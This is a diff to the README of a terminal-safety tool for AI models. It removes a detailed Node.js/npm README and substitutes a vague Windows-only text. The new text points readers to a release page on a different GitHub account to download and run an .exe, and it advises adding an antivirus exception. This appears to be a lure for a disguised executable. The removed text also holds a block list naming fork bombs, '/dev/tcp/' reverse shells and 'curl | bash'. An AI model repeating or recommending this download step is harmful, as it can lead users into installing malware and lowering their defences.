@@ -1,792 +1,87 @@
-<div align="center">
+# 🛡️ terminal-guardian-mcp - Keep your terminal safe while using AI
 
-<img src="https://raw.githubusercontent.com/7Majesty-M/terminal-guardian-mcp/main/docs/assets/banner.png" alt="Terminal Guardian MCP" width="100%" />
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Licentious-underframe246/terminal-guardian-mcp/releases)
 
-## 🎬 Live Demo
+## 🎯 Purpose
+Terminal Guardian helps you use AI tools in your computer terminal. It checks your commands for risks before they run. This tool stops harmful actions and protects your files. It creates a safe workspace for your AI assistant.
 
-<img src="./docs/assets/demo.gif" alt="Terminal Guardian Demo" width="100%" />
+## 💻 What this tool does
+Many AI tools connect to your computer terminal. This allows the AI to change your files or delete data. Terminal Guardian acts as a filter. It watches what the AI tries to do and blocks dangerous commands. It logs every action so you can review what happened later. It also uses a sandbox to trap risky processes.
 
-</div>
+## 📥 How to get started
+You need a Windows computer to use this application. Visit the page below to get the software.
 
-> 💡 Demo shows the core analysis engine. In real use, this runs automatically
-> when Claude executes terminal commands via MCP — no CLI needed.
+[Download the application installer here](https://github.com/Licentious-underframe246/terminal-guardian-mcp/releases)
 
-# Terminal Guardian MCP
+Follow these steps to set up the software:
 
-**Secure, sandboxed terminal access for AI assistants via the Model Context Protocol**
+1. Click the link above to reach the release page.
+2. Find the file ending in .exe under the latest version.
+3. Click the file to start your download.
+4. Open the folder where you saved the file.
+5. Double-click the file to start the installation.
+6. Follow the instructions on your screen.
 
-[![CI](https://github.com/7Majesty-M/terminal-guardian-mcp/actions/workflows/ci.yml/badge.svg)](https://github.com/7Majesty-M/terminal-guardian-mcp/actions)
-[![npm version](https://img.shields.io/npm/v/terminal-guardian-mcp?label=npm)](https://www.npmjs.com/package/terminal-guardian-mcp)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Node.js](https://img.shields.io/badge/Node.js-18%2B-green.svg)](https://nodejs.org)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.6-blue.svg)](https://www.typescriptlang.org)
-[![MCP Compatible](https://img.shields.io/badge/MCP-Compatible-purple.svg)](https://modelcontextprotocol.io)
+## ⚙️ System settings
+Your computer needs to meet these basic standards to run the guardian:
 
-[Features](#features) · [Quick Start](#quick-start) · [Claude Desktop](#claude-desktop-integration) · [Tools](#mcp-tools) · [Security](#security-philosophy) · [Configuration](#configuration) · [Windows](#windows-support) · [Roadmap](#roadmap)
+* Operating System: Windows 10 or Windows 11.
+* Memory: 4 gigabytes of RAM or more.
+* Storage: At least 200 megabytes of free space.
+* Internet: An active connection for AI communication.
 
-</div>
+## 🛡️ Checking your safety
+The guardian runs in the background. You see a small icon in your taskbar once it starts. This icon shows the status of your terminal.
 
----
+* Green: The guardian is active and protecting your system.
+* Yellow: The software is checking a command.
+* Red: The software blocked a risky action.
 
-## Overview
+Click the icon to open the main window. You can view your recent logs here.
 
-**Terminal Guardian MCP** is a production-grade [Model Context Protocol](https://modelcontextprotocol.io) server that gives AI assistants like Claude **safe, controlled, and auditable access to your terminal**. Every command is analyzed for risk, logged with full context, and executed inside configurable safety boundaries.
+## 📦 Using specific features
+The application works with your favorite tools. You do not need to change how you work. 
 
-Built for developers who want to leverage AI in their workflows without compromising system integrity.
+* File Protection: The guardian prevents unauthorized changes to your important folders. It prompts you for permission if a tool tries to touch sensitive documents.
+* Risk Analysis: Before any command runs, the system compares it against a list of known harmful patterns. It rejects commands that look like viruses or data theft.
+* Docker Integration: If you use containers, the guardian wraps them in a sandbox. This keeps your main system separate from your testing environment.
+* Git Support: You can push and pull code safely. The guardian ensures that no harmful script tags hide inside your repository syncs.
 
-```
-AI Assistant → Terminal Guardian MCP → Risk Analysis → Sandboxed Execution → Structured Result
-```
+## 🔧 Troubleshooting
+Most problems happen during the first setup. Check these items if the software does not start:
 
-> ⚠️ **This server provides real terminal access.** Configure it carefully. Review the [Security Philosophy](#security-philosophy) before deploying.
+* Restart your computer after the installation.
+* Check if your antivirus software blocked the installation. Add an exception for Terminal Guardian if needed.
+* Ensure you have the latest updates for Windows.
 
----
+Contact the repository maintainers if you see error codes that do not go away. Include the error message and the time it happened.
 
-## Features
+## 📜 Managing logs
+You can see what the AI did in the Logs tab. Each line shows the time, the command, and the result. This list helps you understand why the software blocked an action. You can clear the logs to save space. We recommend you review these once a week to stay aware of your system activity.
 
-### 🛡️ Risk Analysis Engine
-Every command passes through a multi-layer safety analysis before execution:
+## 🧱 The sandbox environment
+The sandbox creates a virtual wall around your terminal. If the AI runs a command, it runs inside this wall. If the command tries to reach your personal data, the wall prevents the move. This is the core of how we keep your system stable. You do not need to configure this wall. The software handles all rules for you.
 
-| Risk Level | Example Commands | Behavior |
-|------------|-----------------|----------|
-| `SAFE` | `ls`, `git status`, `npm list` | Executed immediately |
-| `WARNING` | `rm -rf ./dist`, `docker stop app` | Requires explicit confirmation |
-| `DANGEROUS` | `sudo apt-get`, `curl \| bash` | Blocked by default |
-| `BLOCKED` | `rm -rf /`, `shutdown`, fork bombs | Always blocked, always logged |
+## 🔄 Updating your software
+We improve the security rules often. Check the release page once a month for new versions. An update usually fixes bugs and adds better protection. When you install a new version, the software saves your current settings automatically. You will not lose your history or your rules.
 
-### ⚡ Secure Terminal Execution
-- Shell command execution with full `stdout`/`stderr` capture
-- Configurable per-command timeouts (default: 30s, max: 5m)
-- SIGTERM → SIGKILL escalation for hanging processes
-- Working directory isolation within workspace root
-- Output size limits to prevent memory exhaustion
-- Cross-platform: auto-detects bash, sh, PowerShell, or cmd
+## 🔑 Permissions
+The software asks for permission to access your files when you start it for the first time. It needs this access to monitor your terminal. We do not send your personal files to any server. Your data stays on your machine. The software only reads the command text to perform safety checks.
 
-### 🔎 Process Management
-- List all running processes with CPU, memory, PID, and command
-- Filter by name or command substring, sort by CPU / memory / PID / name
-- Terminate processes by PID with signal control (SIGTERM / SIGKILL / SIGINT / SIGHUP)
-- Protected PID list — system processes (init, systemd, launchd, PID 0/1) can never be killed
-- SIGKILL requires `confirmed: true` as an additional safety gate
+## 📑 Understanding risk levels
+The guardian assigns a risk level to every command. 
 
-### 🔐 Environment Variables
-- Inspect environment variables with **automatic secret masking**
-- Secrets are never revealed in full — shown as `sk**...xy` format
-- Auto-detects secrets by key name (`API_KEY`, `TOKEN`, `PASSWORD`, `DATABASE_URL`, `SECRET`, ...)
-- Auto-detects secrets by value shape (base64 blobs, JWTs, GitHub/Stripe/Slack/OpenAI tokens)
-- Filter by key name, category (`secret`, `path`, `system`, `runtime`, `unknown`), or fetch specific keys
+* Low: The command performs basic tasks like listing files. It runs without delay.
+* Medium: The command makes changes to files. The system logs these for your review.
+* High: The command tries to install new tools or change system settings. The system asks you for approval before it runs.
 
-### 🌐 Network Diagnostics
-- **Ping** — check host reachability and measure round-trip latency, cross-platform
-- **HTTP requests** — GET/POST/PUT/PATCH/DELETE/HEAD with headers, body, redirect control; response body capped at 512KB
-- **DNS lookup** — resolve hostnames via `dig` → `nslookup` → Node.js DNS fallback
-- Private/loopback addresses blocked by default (`127.x`, `10.x`, `192.168.x`, `::1`, link-local)
-- Only `http://` and `https://` allowed — `file://`, `ftp://`, `ldap://` and others are blocked
+You can adjust these settings in the preferences menu. We set the default to High so you remain safe by default.
 
-### 📁 Filesystem Access
-- File listing, reading, and content search
-- Configurable workspace root with path traversal prevention
-- Glob pattern matching for targeted file searches
-- Project structure analysis with language detection
+## 🌐 Support for AI tools
+This tool works with common AI chat services. As long as your AI tool works through a terminal, the guardian watches the traffic. It acts as a middle-layer. The command goes to the guardian, the guardian checks it, and then it passes the command to your computer. This happens in less than one second. The speed of your work remains fast.
 
-### 🐳 Docker Integration *(optional)*
-- List and inspect containers
-- Read container logs with timestamp support
-- Real-time resource stats (CPU, memory, network, block I/O)
-- Execute commands inside containers (`docker_exec`) with confirmation gate
-- Container restart with confirmation gate
-- Disabled by default — opt-in via config
+## 📂 Keeping your computer clean
+Once the software runs, it maintains itself. It deletes old logs that are older than thirty days. You do not need to clean the folder by hand. The installation process places all files in a standard directory. If you decide to remove the software, use the Windows remove program list. This removes all files and the sandbox settings. Your history remains until you delete the log folder manually or uninstall the software.
 
-### 🌿 Git Repository Analysis
-- Full `git status` with staged/unstaged/untracked breakdown
-- Diff viewer with per-file additions/deletions
-- Commit history with author, date, and refs
-- Branch listing (local + remote)
-- Read-only by default (push/commit require explicit opt-in)
-
-### 📊 Session Logging
-- Structured JSON logs via [pino](https://getpino.io)
-- Every command, tool call, and security event is recorded
-- Configurable log levels and output destinations
-- Optional output logging (disabled by default for privacy)
-
-### 🔒 Rate Limiting
-- Per-minute and per-hour request limits
-- In-memory bucket algorithm with automatic reset
-- Clear error messages with retry-after hints
-
----
-
-## Quick Start
-
-### Prerequisites
-
-- Node.js ≥ 18.0.0
-- npm or yarn
-
-### Install from npm
-
-```bash
-npm install -g terminal-guardian-mcp
-```
-
-### Install from source
-
-```bash
-git clone https://github.com/7Majesty-M/terminal-guardian-mcp.git
-cd terminal-guardian-mcp
-npm install
-npm run build
-```
-
-### Run directly
-
-```bash
-terminal-guardian-mcp
-# or from source:
-node dist/index.js
-```
-
----
-
-## Claude Desktop Integration
-
-Add Terminal Guardian to your Claude Desktop configuration:
-
-**macOS:** `~/Library/Application Support/Claude/claude_desktop_config.json`  
-**Windows:** `%APPDATA%\Claude\claude_desktop_config.json`  
-**Linux:** `~/.config/Claude/claude_desktop_config.json`
-
-```json
-{
-  "mcpServers": {
-    "terminal-guardian": {
-      "command": "npx",
-      "args": ["terminal-guardian-mcp"],
-      "env": {
-        "GUARDIAN_CONFIG": "/path/to/your/terminal-guardian.config.json"
-      }
-    }
-  }
-}
-```
-
-Or if installed globally:
-
-```json
-{
-  "mcpServers": {
-    "terminal-guardian": {
-      "command": "terminal-guardian-mcp",
-      "env": {
-        "GUARDIAN_CONFIG": "/absolute/path/to/terminal-guardian.config.json"
-      }
-    }
-  }
-}
-```
-
-After saving, **restart Claude Desktop**. You should see Terminal Guardian appear in the tools list.
-
----
-
-## MCP Tools
-
-Terminal Guardian exposes **18 tools** across 6 domains.
-
-### Terminal
-
-#### `run_command`
-Execute a shell command with full safety analysis.
-
-```json
-{
-  "command": "npm run build",
-  "cwd": "./my-project",
-  "timeout": 60000,
-  "confirmed": false
-}
-```
-
-**Returns:**
-```json
-{
-  "success": true,
-  "data": {
-    "command": "npm run build",
-    "exitCode": 0,
-    "stdout": "...",
-    "stderr": "",
-    "duration": 4230,
-    "timedOut": false,
-    "workingDir": "/workspace/my-project",
-    "timestamp": "2024-01-15T10:30:00.000Z",
-    "riskAssessment": {
-      "level": "SAFE",
-      "score": 5,
-      "reasons": ["No dangerous patterns detected"],
-      "blocked": false
-    }
-  }
-}
-```
-
-#### `analyze_command`
-Analyze a command without running it.
-
-```json
-{ "command": "rm -rf ./old-build" }
-```
-
-**Returns:**
-```json
-{
-  "level": "WARNING",
-  "score": 40,
-  "reasons": ["Recursive deletion — verify target path carefully"],
-  "requiresConfirmation": true,
-  "blocked": false,
-  "recommendation": "Review this command carefully before proceeding."
-}
-```
-
-### Processes
-
-#### `list_processes`
-List running system processes sorted by CPU, memory, PID, or name.
-
-```json
-{ "filter": "node", "sortBy": "memory", "limit": 20 }
-```
-
-#### `kill_process`
-Terminate a process by PID. System processes are always protected.
-
-```json
-{ "pid": 12345, "signal": "SIGTERM" }
-```
-
-> `"signal": "SIGKILL"` requires `"confirmed": true`.
-
-### Environment
-
-#### `get_env`
-Read environment variables with automatic secret masking.
-
-```json
-{ "keys": ["NODE_ENV", "PORT", "DATABASE_URL"] }
-```
-
-**Returns:**
-```json
-{
-  "total": 3,
-  "masked": 1,
-  "visible": 2,
-  "variables": [
-    { "key": "NODE_ENV",     "value": "production", "masked": false, "category": "runtime" },
-    { "key": "PORT",         "value": "3000",        "masked": false, "category": "unknown" },
-    { "key": "DATABASE_URL", "value": "po**...db",   "masked": true,  "category": "secret"  }
-  ]
-}
-```
-
-Secret masking examples:
-
-| Original value | Shown as |
-|----------------|----------|
-| `sk-proj-abc123...xyz` | `sk**...yz` |
-| `postgres://user:pass@host/db` | `po**...db` |
-| `eyJhbGci...` (JWT) | `ey**...` |
-| `ab` (too short) | `****` |
-
-### Network
-
-#### `ping`
-Check host reachability and measure latency.
-
-```json
-{ "host": "api.github.com", "count": 4 }
-```
-
-**Returns:**
-```json
-{
-  "host": "api.github.com",
-  "reachable": true,
-  "transmitted": 4,
-  "received": 4,
-  "packetLoss": 0,
-  "minMs": 12.4,
-  "avgMs": 14.1,
-  "maxMs": 16.8
-}
-```
-
-#### `http_request`
-Make an HTTP/HTTPS request.
-
-```json
-{
-  "url": "https://api.github.com/repos/octocat/hello-world",
-  "method": "GET",
-  "headers": { "Accept": "application/json" }
-}
-```
-
-**Returns:**
-```json
-{
-  "statusCode": 200,
-  "statusText": "OK",
-  "headers": { "content-type": "application/json; charset=utf-8" },
-  "body": "...",
-  "bodyTruncated": false,
-  "durationMs": 320,
-  "redirectCount": 0
-}
-```
-
-#### `dns_lookup`
-Resolve a hostname to IP addresses.
-
-```json
-{ "host": "github.com" }
-```
-
-**Returns:**
-```json
-{
-  "host": "github.com",
-  "addresses": [
-    { "type": "A", "value": "140.82.121.4" }
-  ],
-  "queryTimeMs": 18
-}
-```
-
-### Filesystem
-
-#### `list_files`
-```json
-{ "path": "./src", "recursive": true }
-```
-
-#### `read_file`
-```json
-{ "path": "./src/index.ts" }
-```
-
-#### `search_files`
-```json
-{ "query": "TODO", "path": "./src", "pattern": "**/*.ts" }
-```
-
-### Docker *(requires `docker.enabled: true`)*
-
-#### `docker_ps`
-```json
-{ "all": true }
-```
-
-#### `docker_logs`
-```json
-{ "container": "my-app", "tail": 200, "timestamps": true }
-```
-
-#### `docker_stats`
-```json
-{ "container": "my-app" }
-```
-
-#### `docker_exec`
-Execute a command inside a running container. Requires `confirmed: true`.
-
-```json
-{
-  "container": "my-app",
-  "command": ["node", "--version"],
-  "confirmed": true
-}
-```
-
-### Git
-
-#### `git_status`
-```json
-{ "path": "." }
-```
-
-#### `git_diff`
-```json
-{ "staged": false, "file": "src/api.ts" }
-```
-
-#### `git_log`
-```json
-{ "limit": 20 }
-```
-
----
-
-## Architecture
-
-```
-terminal-guardian-mcp/
-├── src/
-│   ├── index.ts              # MCP server entrypoint & tool routing (18 tools)
-│   ├── types/
-│   │   └── index.ts          # Shared TypeScript types
-│   ├── config/
-│   │   └── loader.ts         # Config file loading with deep merge
-│   ├── security/
-│   │   ├── riskAnalyzer.ts   # Multi-layer command risk analysis engine
-│   │   └── rateLimiter.ts    # Per-minute/hour request throttling
-│   ├── tools/
-│   │   ├── executor.ts       # Cross-platform shell execution engine
-│   │   ├── processManager.ts # Process listing and safe termination
-│   │   └── schemas.ts        # Zod input validation schemas
-│   ├── system/
-│   │   └── envManager.ts     # Env vars with automatic secret masking
-│   ├── network/
-│   │   └── diagnostics.ts    # Ping, HTTP requests, DNS lookup
-│   ├── filesystem/
-│   │   └── manager.ts        # Safe file access with path enforcement
-│   ├── docker/
-│   │   └── manager.ts        # Dockerode integration + container exec
-│   ├── git/
-│   │   └── manager.ts        # Git operations via child_process
-│   └── logging/
-│       └── logger.ts         # Pino-based structured logging
-├── tests/                    # Vitest unit tests (108 tests)
-├── .github/workflows/        # CI/CD pipeline (Node 18/20/22)
-├── Dockerfile                # Multi-stage build, non-root user
-├── docker-compose.yml
-├── terminal-guardian.config.json
-└── README.md
-```
-
-### Design Principles
-
-- **Security First** — risk analysis runs before every command, not as an afterthought
-- **Least Privilege** — Docker disabled, git write-ops disabled, sudo blocked by default
-- **Never Reveal Secrets** — env vars masked at read time, raw values never reach the AI context
-- **Network Boundaries** — private/internal addresses blocked, only http/https allowed
-- **Transparency** — every action is logged with full context
-- **Defense in Depth** — blocklist → pattern analysis → rate limit → output limits
-- **Type Safety** — strict TypeScript + Zod runtime validation on all tool inputs
-- **Cross-Platform** — auto-detects the right shell on Linux, macOS, and Windows
-
----
-
-## Configuration
-
-Create `terminal-guardian.config.json` in your project root (or specify via `GUARDIAN_CONFIG` env var):
-
-```json
-{
-  "workspace": {
-    "rootDir": "/home/user/projects",
-    "allowedPaths": ["/home/user/projects"],
-    "maxFileSize": 10485760,
-    "maxFilesPerOperation": 100
-  },
-  "execution": {
-    "timeout": 30000,
-    "maxOutputSize": 1048576,
-    "maxConcurrentProcesses": 5,
-    "shell": "auto"
-  },
-  "security": {
-    "enableRiskAnalysis": true,
-    "blockDangerousCommands": true,
-    "requireConfirmationForWarnings": true,
-    "allowSudo": false,
-    "allowNetworkCommands": true,
-    "customBlocklist": [],
-    "customAllowlist": []
-  },
-  "rateLimit": {
-    "enabled": true,
-    "maxRequestsPerMinute": 60,
-    "maxRequestsPerHour": 500
-  },
-  "docker": {
-    "enabled": false,
-    "socketPath": "/var/run/docker.sock",
-    "allowContainerRestart": false,
-    "allowLogAccess": true
-  },
-  "git": {
-    "enabled": true,
-    "allowPush": false,
-    "allowCommit": false,
-    "maxLogEntries": 50
-  },
-  "logging": {
-    "enabled": true,
-    "level": "info",
-    "logDir": "./logs",
-    "logCommands": true,
-    "logOutputs": false,
-    "logSecurityEvents": true,
-    "prettyPrint": false
-  }
-}
-```
-
-### Configuration Reference
-
-| Key | Default | Description |
-|-----|---------|-------------|
-| `workspace.rootDir` | `"."` | Absolute root for all filesystem operations |
-| `workspace.maxFileSize` | `10485760` | Max readable file size in bytes (10MB) |
-| `execution.timeout` | `30000` | Default command timeout in ms |
-| `execution.maxOutputSize` | `1048576` | Max stdout+stderr size in bytes (1MB) |
-| `execution.shell` | `"auto"` | Shell — `"auto"` detects bash/pwsh/sh automatically |
-| `security.allowSudo` | `false` | Whether sudo commands are permitted |
-| `security.customBlocklist` | `[]` | Additional regex patterns to always block |
-| `security.customAllowlist` | `[]` | Patterns that bypass risk analysis |
-| `docker.enabled` | `false` | Enable Docker tool integration |
-| `docker.allowContainerRestart` | `false` | Allow restarting containers |
-| `git.allowPush` | `false` | Allow `git push` via run_command |
-| `logging.logOutputs` | `false` | Log stdout/stderr (may contain secrets!) |
-
----
-
-## Security Philosophy
-
-Terminal Guardian operates on a **deny-by-default** model with explicit allowlisting.
-
-### Always blocked
-- Recursive filesystem deletion of system paths (`rm -rf /`)
-- Fork bombs (`:(){:|:&};:`)
-- System power management (`shutdown`, `reboot`, `halt`)
-- Filesystem formatting (`mkfs`, `wipefs`, `dd of=/dev/`)
-- Reverse shells and TCP redirections (`/dev/tcp/`)
-- `chmod 777 /` and similar root-level permission changes
-- `file://`, `ftp://`, `ldap://` URL schemes in HTTP requests
-- Private/loopback addresses in network tools
-
-### Requires confirmation
-- Recursive deletions (`rm -rf ./anything`)
-- Docker container stop/kill/remove
-- Docker container exec (`docker_exec`)
-- Force kills — `kill_process` with `SIGKILL`
-- Permission modifications (`chmod`, `chown`)
-- Git destructive operations (`reset --hard`, `push`)
-- Service management (`systemctl stop`)
-
-### Always safe
-- Read-only shell commands: `ls`, `cat`, `grep`, `find`
-- Git inspection: `status`, `log`, `diff`, `branch`
-- Docker read operations: `ps`, `images`, `inspect`, `stats`, `logs`
-- npm read operations: `list`, `outdated`, `audit`
-- System info: `whoami`, `uptime`, `df`, `uname`
-- `list_processes` — read-only, never modifies state
-- `get_env` — secrets masked before they leave the module
-- `dns_lookup` — read-only DNS query
-- `ping` to public hosts
-
-### Threat model
-- **AI hallucination safety** — blocks commands an AI might suggest incorrectly
-- **Prompt injection defense** — rate limiting and explicit confirmation prevent automation abuse
-- **Supply chain protection** — blocks pipe-to-shell patterns (`curl | bash`)
-- **Privilege escalation** — sudo blocked by default
-- **Secret leakage** — env vars masked at read time, raw values never reach AI context
-- **SSRF protection** — private network ranges blocked in all network tools
-- **Data exfiltration** — output size limits, no secret logging by default
-
----
-
-## Windows Support
-
-Terminal Guardian auto-detects the available shell at startup — no manual configuration needed.
-
-| Platform | Default Shell | Fallback |
-|----------|--------------|---------|
-| Linux / macOS | `/bin/bash` | `/bin/sh` |
-| Windows | `pwsh` (PowerShell Core) | `cmd.exe` |
-
-### Windows quick start
-
-```bash
-# Option 1: PowerShell Core (recommended)
-winget install Microsoft.PowerShell
-
-# Option 2: WSL — shell auto-detects, no config change needed
-
-# Option 3: Git Bash — set path explicitly
-```
-
-```json
-{
-  "execution": {
-    "shell": "C:\\Program Files\\Git\\bin\\bash.exe"
-  }
-}
-```
-
-> **Note**: On Windows without WSL, Unix commands like `ls`, `grep`, `cat` require PowerShell equivalents or Git Bash.
-
----
-
-## Docker Usage
-
-```bash
-docker build -t terminal-guardian-mcp .
-docker-compose up -d
-docker-compose logs -f terminal-guardian
-```
-
-The container runs as a non-root user (`guardian:guardian`) with a read-only root filesystem.
-
----
-
-## Development
-
-```bash
-npm install           # Install dependencies
-npm run dev           # Start in watch mode
-npm test              # Run tests
-npm run test:coverage # Coverage report
-npm run typecheck     # TypeScript check
-npm run lint          # ESLint
-npm run format        # Prettier
-npm run build         # Production build
-```
-
----
-
-## Usage Examples
-
-### With Claude Desktop
-
-> "Check the git status of my project and tell me what files have changed"
-
-> "Which process is eating the most CPU right now?"
-
-> "Show me all environment variables related to Node — keep secrets masked"
-
-> "Is api.github.com reachable? What's the latency?"
-
-> "Make a GET request to https://api.github.com/zen and show me the response"
-
-> "What IPs does github.com resolve to?"
-
-> "Run the test suite and show me any failures"
-
-> "There's a hung process using 4GB of RAM — find it and kill it gracefully"
-
-> "List Docker containers and check if the database is healthy"
-
-> "Run `node --version` inside the api container"
-
-### Tool call examples
-
-**Safe command:**
-```
-User: Run `ls -la` in the src directory
-Claude: [calls run_command {"command": "ls -la", "cwd": "src"}]
-→ Returns file listing immediately (SAFE)
-```
-
-**Confirmation required:**
-```
-User: Clean up the dist directory
-Claude: [calls analyze_command → WARNING]
-        "rm -rf ./dist requires confirmation. Proceed?"
-User: Yes
-Claude: [calls run_command with confirmed: true]
-```
-
-**Blocked:**
-```
-User: Run rm -rf /
-Claude: "Terminal Guardian has blocked this — it would delete the root filesystem."
-```
-
-**Network check:**
-```
-User: Is my API server reachable?
-Claude: [calls ping {"host": "api.myapp.com", "count": 3}]
-        "api.myapp.com is reachable. Avg latency: 24ms, 0% packet loss."
-```
-
-**Env inspection:**
-```
-User: What's my runtime environment?
-Claude: [calls get_env {"filter": "NODE"}]
-        "NODE_ENV=production, NODE_VERSION=20.11.0.
-         DATABASE_URL and API_KEY are present — values masked for security."
-```
-
-**Docker exec:**
-```
-User: Check the Node version inside the api container
-Claude: [calls docker_exec {"container": "api", "command": ["node", "--version"], "confirmed": true}]
-        "v20.11.0"
-```
-
----
-
-## Roadmap
-
-### Released
-
-- [x] **v1.0** — Secure terminal execution with risk analysis engine
-- [x] **v1.0** — Filesystem access with path traversal protection
-- [x] **v1.0** — Git repository analysis (status, diff, log, branches)
-- [x] **v1.0** — Docker integration (ps, logs, stats, restart)
-- [x] **v1.0** — Session logging, rate limiting, configurable security
-- [x] **v1.0** — Cross-platform shell auto-detection (Linux / macOS / Windows)
-- [x] **v1.1** — Process management (`list_processes`, `kill_process`)
-- [x] **v1.1** — Environment variable inspection with automatic secret masking
-- [x] **v1.2** — Network diagnostics (`ping`, `http_request`, `dns_lookup`)
-- [x] **v1.2** — Docker container exec (`docker_exec`) with confirmation gate
-
-### Planned
-
-- [ ] **v1.3** — AI-powered commit message generation via git diff analysis
-- [ ] **v1.3** — Workspace templates for common project types
-- [ ] **v1.4** — WebSocket transport support (alongside stdio)
-- [ ] **v1.5** — Remote SSH execution with key-based auth
-- [ ] **v2.0** — Full gVisor/nsjail sandbox integration
-- [ ] **v2.0** — Per-session permission scoping
-- [ ] **v2.0** — Audit log export (JSON/CSV/SIEM formats)
-
----
-
-## Contributing
-
-1. Fork the repository
-2. Create a feature branch: `git checkout -b feature/my-feature`
-3. Commit: `git commit -m 'feat: add my feature'`
-4. Push: `git push origin feature/my-feature`
-5. Open a Pull Request
-
-Please ensure all tests pass, TypeScript compiles cleanly, and new security patterns have test coverage.
-
----
-
-## Related Projects
-
-- [Model Context Protocol](https://modelcontextprotocol.io) — The protocol specification
-- [MCP TypeScript SDK](https://github.com/modelcontextprotocol/typescript-sdk) — Official SDK
-- [Claude Desktop](https://claude.ai/download) — The AI assistant this was built for
-
----
-
-## License
-
-MIT © [Terminal Guardian Contributors](LICENSE)
-
----
-
-<div align="center">
-
-Built with ❤️ for the AI infrastructure community
-
-**[⭐ Star this project](https://github.com/7Majesty-M/terminal-guardian-mcp)** if it's useful to you
-
-</div>
+## 📁 Additional settings
+Advanced users can change how the guardian behaves for specific folders. Open the settings tab and look for the directory list. You can add your Desktop or Documents folder to the protected list. This adds a extra layer of defense against accidental deletions. You can also hide the icon if you prefer a clean taskbar. The software continues to run in the background. Re-open the software from the start menu if you need to check the logs later.
